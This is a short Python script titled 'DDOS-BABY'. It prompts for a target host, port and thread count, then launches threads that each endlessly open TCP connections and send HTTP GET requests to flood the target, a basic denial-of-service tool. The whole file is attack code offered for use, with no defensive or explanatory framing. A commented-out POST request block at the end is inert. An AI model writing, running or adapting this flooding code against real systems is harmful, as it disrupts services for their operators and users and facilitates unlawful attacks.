#!/bin/env python3

#importing libraries
import requests
import socket
import threading ##threading to speed up the process
import os

os.system("clear") 
os.system("toilet DDOS-BABY")


target = str(input("Enter the target name or ip or domain name or url: "))
port = int(input("Enter the target port number: "))
trd = int(input("Enter the number of threads: "))

##attacking mechanism will as follows
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.close()


for i in range(trd):
    thread = threading.Thread(target=attack)
    thread.start()


##os.system("clear") 
##os.system("toilet DDOS-BABY")


'''
##sending request to the server

data = {'key1': 'value1', 'key2': 'value2'}

##sending a post to the server
response = requests.post(target, data=data)

##printing the status code
print(response.status_code)
'''


